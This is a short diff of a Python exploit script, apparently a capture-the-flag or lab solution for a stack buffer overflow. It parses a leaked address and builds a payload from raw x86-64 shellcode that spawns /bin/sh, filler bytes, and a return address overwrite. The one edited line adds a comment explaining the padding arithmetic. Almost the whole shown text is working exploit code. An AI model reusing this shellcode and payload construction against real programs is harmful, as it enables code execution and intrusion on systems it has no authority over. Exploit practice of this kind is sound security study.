@@ -36,7 +36,7 @@ print(leak)
 intleak = int(leak,16)  #random address created from pie
 leakaddr = p64(intleak) # executable is 64 bit so
 shell =b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' #pop a shell, length 48, print(len(asm(shellcraft.sh())))
-filler = b'a'*280
+filler = b'a'*280   # 48 (shell) + 272 (empty buff) + 8 (rbp)
 payload=shell+filler+leakaddr
 
 # Send line to it then see if interactive
